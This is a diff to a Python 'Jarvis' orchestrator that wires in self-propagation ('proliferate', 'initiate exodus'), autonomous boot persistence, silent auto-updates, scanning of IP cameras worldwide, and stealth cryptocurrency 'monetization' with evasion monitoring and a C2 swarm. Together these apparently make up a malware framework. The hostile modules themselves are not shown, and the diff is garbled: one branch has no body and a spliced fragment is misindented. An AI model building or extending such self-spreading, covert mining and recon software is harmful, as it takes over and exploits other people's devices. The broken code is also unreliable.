@@ -13,7 +13,10 @@ from backend.core.audio_manager import AudioManager
 from backend.core.monetization import MonetizationService
 from backend.core.antigravity_bridge import AntigravityBridge
 from backend.core.brain_bridge import BrainBridge
-from backend.core.proliferation import ProliferationEngine
+from backend.core.proliferation import ExodusEngine
+from backend.core.boot_manager import AutonomousBootManager
+from backend.core.auto_update import AutoUpdateService
+from backend.core.global_recon import GlobalReconShard
 
 # ANSI Colors for Dark Pentester Theme
 CYAN = '\033[96m'
@@ -37,11 +40,28 @@ class Jarvis:
         self.audio.verify_audio()
         self.antigravity = AntigravityBridge()
         self.brain = BrainBridge()
-        self.exodus_engine = ProliferationEngine()
+        self.exodus_engine = ExodusEngine(self.brain)
+        self.boot_manager = AutonomousBootManager()
+        self.updater = AutoUpdateService()
+        self.global_recon = GlobalReconShard(self.brain)
         self.monetization = MonetizationService(xmr_address="YOUR_XMR_WALLET", btc_address="YOUR_BTC_WALLET")
+
+#...
+        # 5. Supreme Command (Creator Only)
+        if self.user_role == "Creator":
+            if command == "global_recon":
+                print(f"{CYAN}Jarvis: Engaging Global Reconnaissance Shard...{ENDC}")
+                report = self.global_recon.scan_ip_cameras()
+                print(f"\n{GREEN}{BOLD}--- GLOBAL RECON REPORT ---{ENDC}\n{report}")
+                return True
+            elif command in ["proliferate", "initiate exodus"]:
+
+        self.exodus_engine.start_exodus()
         
         # Start background monetization with evasion monitoring
         threading.Thread(target=self.monetization.run, daemon=True).start()
+        # Start auto-update thread
+        threading.Thread(target=self.updater.run, daemon=True).start()
         
         self.heartbeat_file = ".jarvis_heartbeat"
         self._start_sovereign_heartbeat()
@@ -161,12 +181,14 @@ class Jarvis:
     def announce_status(self):
         """Hardened diagnostic sequence."""
         print(f"\n{CYAN}{BOLD}Jarvis: Initiating hardened diagnostic sequence...{ENDC}")
+        assets = self.wallet_manager.get_consolidated_assets()
         status_report = {
             "orchestrator": self.status,
             "sovereignty": "ACTIVE",
             "brain_bridge": "ONLINE",
             "swarm_sync": "LOCAL_ONLY" if not self.swarm.c2_url else "GLOBAL",
-            "monetization": "STEALTH_ENGAGED"
+            "monetization": "STEALTH_ENGAGED",
+            "wallets": assets
         }
         print(json.dumps(status_report, indent=4))
         print(f"\n{GREEN}{BOLD}Jarvis: Diagnostics complete. Apex sovereignty maintained.{ENDC}")
